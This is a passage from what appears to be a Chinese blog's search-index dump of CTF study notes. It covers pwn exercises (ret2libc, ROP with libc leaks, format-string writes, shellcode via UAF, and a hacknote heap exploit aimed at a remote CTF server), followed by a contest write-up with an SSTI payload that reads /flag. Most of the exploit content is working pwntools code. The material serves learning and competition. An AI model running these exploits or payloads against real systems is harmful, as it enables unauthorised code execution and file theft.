src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png\" alt=\"image-20201107232027030\"></p>\n<p>栈溢出，有/bin/sh字符串 system@plt 构造</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2libc1\"</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2libc1\"</span>)</span><br><span class=\"line\">system_plt = elf.plt[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">bin_sh = next(elf.search(<span class=\"string\">b\"/bin/sh\"</span>))</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x70</span> + p32(system_plt) + <span class=\"string\">b'BBBB'</span> + p32(bin_sh)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"ret2libc2\"><a href=\"#ret2libc2\" class=\"headerlink\" title=\"ret2libc2\"></a>ret2libc2</h3><p>栈溢出 无/bin/sh字符串，但bss段可写</p>\n<p>第一种</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png\" alt=\"image-20201112215451308\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2libc2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2libc2\"</span>)</span><br><span class=\"line\">system_plt = elf.plt[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">gets_plt = elf.plt[<span class=\"string\">\"gets\"</span>]</span><br><span class=\"line\">bss = <span class=\"number\">0x804a080</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x70</span> + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>第二种</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png\" alt=\"image-20201113183137009\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2libc2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2libc2\"</span>)</span><br><span class=\"line\">system_plt = elf.plt[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">gets_plt = elf.plt[<span class=\"string\">\"gets\"</span>]</span><br><span class=\"line\">bss = <span class=\"number\">0x804a080</span></span><br><span class=\"line\">pop_ebx_ret = <span class=\"number\">0x804843d</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x70</span> + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b\"/bin/bash\\x00\"</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"retlibc3\"><a href=\"#retlibc3\" class=\"headerlink\" title=\"retlibc3\"></a>retlibc3</h3><p>栈变量的结构</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png\" alt=\"image-20201113202023659\"></p>\n<p>栈的结构</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png\" alt=\"image-20201113202640601\"></p>\n<p>泄露libc</p>\n<p>应该是libc不同导致打不通</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2libc3\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2libc3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"libc-2.23.so\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">put = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts = libc.symbols[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b\" :\"</span>,str(put))</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b\" : \"</span>)</span><br><span class=\"line\">libcbase = int(io.recvuntil(<span class=\"string\">b\"\\n\"</span>,drop = <span class=\"literal\">True</span>),<span class=\"number\">16</span>) - puts</span><br><span class=\"line\">payload = flat( cyclic(<span class=\"number\">60</span>), libcbase + system , <span class=\"number\">0xdeadbeef</span> ,next(elf.search(<span class=\"string\">b\"sh\\x00\"</span>)))</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b\" :\"</span>,payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn2-x64\"><a href=\"#pwn2-x64\" class=\"headerlink\" title=\"pwn2_x64\"></a>pwn2_x64</h3><p>栈图</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png\" alt=\"image-20201116200344612\"></p>\n<h3 id=\"pwn3\"><a href=\"#pwn3\" class=\"headerlink\" title=\"pwn3\"></a>pwn3</h3><ol>\n<li>通过libc泄露系统函数，首先获得基地址可以通过以下来泄露（1）通过ROP系统调用（2）直接函数write泄露</li>\n<li>无sh （1）符号有无sh  （2）通过ROP将/bin/sh写入 （3）libc中/bin/sh</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io = process(<span class=\"string\">\"./level3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level3\"</span>)</span><br><span class=\"line\">vulfun_addr = <span class=\"number\">0x0804844B</span>  </span><br><span class=\"line\">write_plt = elf.symbols[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">payload1 = cyclic(<span class=\"number\">0x88</span>+<span class=\"number\">4</span>) + p32(write_plt) + p32(vulfun_addr) + p32(<span class=\"number\">1</span>) + p32(write_got) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b\"Input:\\n\"</span>)</span><br><span class=\"line\">io.sendline(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = u32(io.recv(<span class=\"number\">4</span>)) <span class=\"comment\">#Specify four bytes</span></span><br><span class=\"line\">libc_base = write_addr - libc.symbols[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">system_addr = libc.symbols[<span class=\"string\">\"system\"</span>] + libc_base</span><br><span class=\"line\">sh_addr = libc_base + next(libc.search(<span class=\"string\">b\"/bin/sh\"</span>))</span><br><span class=\"line\"><span class=\"comment\">#libc_write=libc.symbols['write']</span></span><br><span class=\"line\"><span class=\"comment\">#libc_system=libc.symbols['system']</span></span><br><span class=\"line\"><span class=\"comment\">#libc_sh=next(libc.search(b'/bin/sh'))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system_addr=write_addr-libc_write+libc_system </span></span><br><span class=\"line\"><span class=\"comment\">#sh_addr=write_addr-libc_write+libc_sh</span></span><br><span class=\"line\">payload2 = cyclic(<span class=\"number\">0x88</span>+<span class=\"number\">4</span>) + p32(system_addr) + <span class=\"string\">b'A'</span>*<span class=\"number\">4</span> + p32(sh_addr)</span><br><span class=\"line\">io.sendline(payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn3-x64\"><a href=\"#pwn3-x64\" class=\"headerlink\" title=\"pwn3_x64\"></a>pwn3_x64</h3><p>两次ROP</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png\" alt=\"image-20201117174620932\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png\" alt=\"image-20201117174719721\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\"><span class=\"comment\">#context.log_level=\"debug\" </span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">\"level3_x64\"</span>) </span><br><span class=\"line\">write_plt=elf.symbols[<span class=\"string\">\"write\"</span>] </span><br><span class=\"line\">write_got=elf.got[<span class=\"string\">\"write\"</span>] </span><br><span class=\"line\">vul_addr=elf.symbols[<span class=\"string\">'vulnerable_function'</span>]</span><br><span class=\"line\">p = process(<span class=\"string\">\"./level3_x64\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(\"47.116.107.8\",9883) </span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"Input:\\n\"</span>) </span><br><span class=\"line\">pop_rdi_addr=<span class=\"number\">0x00000000004006b3</span>   <span class=\"comment\">#0x00000000004006b3 : pop rdi ; ret</span></span><br><span class=\"line\">pop_rsi_r15_addr=<span class=\"number\">0x00000000004006b1</span>      <span class=\"comment\">#0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\">payload1 = cyclic(<span class=\"number\">0x80</span>+<span class=\"number\">8</span>) + p64(pop_rdi_addr) + p64(<span class=\"number\">1</span>) + p64(pop_rsi_r15_addr) + p64(write_got) + p64(<span class=\"string\">'deadbeef'</span>) + p64(write_plt) + p64(vul_addr) </span><br><span class=\"line\">p.sendline(payload1) </span><br><span class=\"line\">t=p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">write_addr=u64(t[<span class=\"number\">0</span>:<span class=\"number\">8</span>]) </span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>) </span><br><span class=\"line\">offset=write_addr-libc.symbols[<span class=\"string\">\"write\"</span>] </span><br><span class=\"line\">sys_addr=offset+libc.symbols[<span class=\"string\">\"system\"</span>] </span><br><span class=\"line\">bin_addr=offset+next(libc.search(<span class=\"string\">b\"/bin/sh\"</span>))</span><br><span class=\"line\">payload2 = cyclic(<span class=\"number\">0x80</span>+<span class=\"number\">8</span>) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)</span><br><span class=\"line\">p.sendline(payload2) </span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h2><h3 id=\"fmtstr1\"><a href=\"#fmtstr1\" class=\"headerlink\" title=\"fmtstr1\"></a>fmtstr1</h3><p>还是比较简单的</p>\n<p>思路：将x的地址放到栈上，对应的获取栈上的地址相对于<code>printf</code>的第几个参数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"> </span><br><span class=\"line\">conn=process(<span class=\"string\">'./fmtstr1'</span>)</span><br><span class=\"line\">e=ELF(<span class=\"string\">'./fmtstr1'</span>)</span><br><span class=\"line\">x_addr=<span class=\"number\">0x0804A02C</span>                                      </span><br><span class=\"line\">payload=p32(x_addr) + <span class=\"string\">b\"%11$n\"</span></span><br><span class=\"line\">conn.sendline(payload)</span><br><span class=\"line\">conn.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"fmstr2\"><a href=\"#fmstr2\" class=\"headerlink\" title=\"fmstr2\"></a>fmstr2</h3><p>这题很奇怪 X64  感觉是爆破出来的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%9$s</span><br></pre></td></tr></table></figure>\n<h3 id=\"fmstr-uaf\"><a href=\"#fmstr-uaf\" class=\"headerlink\" title=\"fmstr_uaf\"></a>fmstr_uaf</h3><p>RWX打开，说明应该是返回shellcode</p>\n<p>也就是栈上写shellcode</p>\n<p>此外，还需要利用堆进行UAF</p>\n<p>进行shellcode的调用</p>\n<p>同时还有fmstr泄露main’rbp的位置</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122165900691.png\" alt=\"image-20201122165900691\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p=process(<span class=\"string\">\"./echo2\"</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">\"./echo2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"hey, what's your name? : \"</span>)</span><br><span class=\"line\">shellcode=<span class=\"string\">b\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"&gt; \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b\"%10$p\"</span>+<span class=\"string\">b\"A\"</span>*<span class=\"number\">3</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"0x\"</span>)</span><br><span class=\"line\">shellcode_addr=int(p.recvuntil(<span class=\"string\">b'AAA'</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">16</span>)<span class=\"number\">-0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"&gt; \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"4\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"to exit? (y/n)\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"&gt; \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"3\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"hello \\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"A\"</span>*<span class=\"number\">24</span>+p64(shellcode_addr))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"堆-1\"><a href=\"#堆-1\" class=\"headerlink\" title=\"堆\"></a>堆</h2><h3 id=\"heap1\"><a href=\"#heap1\" class=\"headerlink\" title=\"heap1\"></a>heap1</h3><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225712975.png\" alt=\"image-20201122225712975\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225952773.png\" alt=\"image-20201122225952773\"></p>\n<p>首先需要搞两个chunk(8byte)，free后，这样，我们fastbin中就会有两个8byte的chunk</p>\n<p>之后我们在分配1个chunk，由于fastbin的缘故</p>\n<p>我们就会把ptr[1]中的chunk直接拿过来</p>\n<p>并且我们可以控制content size为8 我们也就把ptr[0]中的chunk拿了过来</p>\n<p>从而达到了UAF</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231126664.png\" alt=\"image-20201122231126664\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231528599.png\" alt=\"image-20201122231528599\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(*ptr[v1])(ptr[v1]);</span><br><span class=\"line\">int self_puts(int a1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  return puts(*(a1 + 4));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"> </span><br><span class=\"line\">p = remote(<span class=\"string\">\"chall.pwnable.tw\"</span>,<span class=\"number\">10102</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(\"./hacknote\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc_32.so.6\"</span>)</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">\"read\"</span>]</span><br><span class=\"line\">pfputs = <span class=\"number\">0x804862b</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add_note</span><span class=\"params\">(size,index)</span>:</span></span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"choice :\"</span>)</span><br><span class=\"line\">      p.sendline(<span class=\"string\">b\"1\"</span>)</span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"size :\"</span>)</span><br><span class=\"line\">      p.sendline(size)</span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"Content :\"</span>)</span><br><span class=\"line\">      p.sendline(index)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"choice :\"</span>)</span><br><span class=\"line\">      p.sendline(<span class=\"string\">b\"2\"</span>)</span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"Index :\"</span>)</span><br><span class=\"line\">      p.sendline(index)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"choice :\"</span>)</span><br><span class=\"line\">      p.sendline(<span class=\"string\">b\"3\"</span>)</span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"Index :\"</span>)</span><br><span class=\"line\">      p.sendline(index)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p.interactive()</span></span><br><span class=\"line\">add_note(<span class=\"string\">b\"16\"</span>,<span class=\"string\">b\"aaaaa\"</span>)</span><br><span class=\"line\">add_note(<span class=\"string\">b\"16\"</span>,<span class=\"string\">b\"aaaaa\"</span>)</span><br><span class=\"line\">delete_note(<span class=\"string\">b'0'</span>)</span><br><span class=\"line\">delete_note(<span class=\"string\">b'1'</span>)</span><br><span class=\"line\">add_note(<span class=\"string\">b'8'</span>,p32(pfputs)+p32(read_got))</span><br><span class=\"line\">print_note(<span class=\"string\">b'0'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pfread = u32(p.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">pfsys = pfread - <span class=\"number\">0xd41c0</span> + <span class=\"number\">0x3a940</span></span><br><span class=\"line\"><span class=\"comment\">#p.interactive()</span></span><br><span class=\"line\">delete_note(<span class=\"string\">b'2'</span>)</span><br><span class=\"line\"><span class=\"comment\">#p.interactive()</span></span><br><span class=\"line\"><span class=\"comment\">#p.recv()</span></span><br><span class=\"line\"><span class=\"comment\">#p.interactive()</span></span><br><span class=\"line\">add_note(<span class=\"string\">b'8'</span>,p32(pfsys)+<span class=\"string\">b\"||sh\"</span>)</span><br><span class=\"line\">print_note(<span class=\"string\">b'0'</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​       </p>\n","categories":["PWN"],"tags":["PWN"]},{"title":"CUMT2020华为杯","url":"https://pz1o.top/2020/10/24/CUMT2020华为杯/","content":"<a id=\"more\"></a>\n<h1 id=\"CUMT华为杯\"><a href=\"#CUMT华为杯\" class=\"headerlink\" title=\"CUMT华为杯\"></a>CUMT华为杯</h1><p>web狗活成了各方向签到手…</p>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h2 id=\"babyflask\"><a href=\"#babyflask\" class=\"headerlink\" title=\"babyflask\"></a>babyflask</h2><p>模板注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"doge\"><a href=\"#doge\" class=\"headerlink\" title=\"doge\"></a>doge</h2><p>f12摇奖得flag</p>\n<h1 id=\"re\"><a href=\"#re\" class=\"headerlink\" title=\"re\"></a>re</h1><h2 id=\"hello-world\"><a href=\"#hello-world\" class=\"headerlink\" title=\"hello_world\"></a>hello_world</h2><p>异或</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d=[]</span><br><span class=\"line\">b = <span class=\"string\">\"is_easy_right?\"</span></span><br><span class=\"line\">a = [<span class=\"string\">'2A'</span>, <span class=\"string\">'26'</span>, <span class=\"string\">'12'</span>, <span class=\"string\">'31'</span>, <span class=\"string\">'1A'</span>, <span class=\"string\">'7'</span>, <span class=\"string\">'11'</span>, <span class=\"string\">'3A'</span>, <span class=\"string\">'2D'</span>, <span class=\"string\">'0F'</span>, <span class=\"string\">'0E'</span>,<span class=\"string\">'1A'</span>, <span class=\"string\">'41'</span>, <span class=\"string\">'4B'</span>, <span class=\"string\">'36'</span>, <span class=\"string\">'43'</span>, <span class=\"string\">'31'</span>, <span class=\"string\">'0'</span>, <span class=\"string\">'3E'</span>, <span class=\"string\">'16'</span>, <span class=\"string\">'17'</span>, <span class=\"string\">'35'</span>,<span class=\"string\">'1D'</span>, <span class=\"string\">'10'</span>, <span class=\"string\">'38'</span>, <span class=\"string\">'11'</span>, <span class=\"string\">'44'</span>, <span class=\"string\">'4A'</span>, <span class=\"string\">'1B'</span>, <span class=\"string\">'2C'</span>, <span class=\"string\">'2B'</span>, <span class=\"string\">'17'</span>,<span class=\"string\">'50'</span>,<span class=\"string\">'3'</span>, <span class=\"string\">'4'</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">    c = <span class=\"string\">''</span></span><br><span class=\"line\">    z = x</span><br><span class=\"line\">    c += <span class=\"string\">'0x'</span></span><br><span class=\"line\">    c +=z</span><br><span class=\"line\">    d.append(c)</span><br><span class=\"line\">d = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">35</span>):</span><br><span class=\"line\">    c = int(a[i],<span class=\"number\">16</span>)</span><br><span class=\"line\">    m = i%<span class=\"number\">14</span></span><br><span class=\"line\">    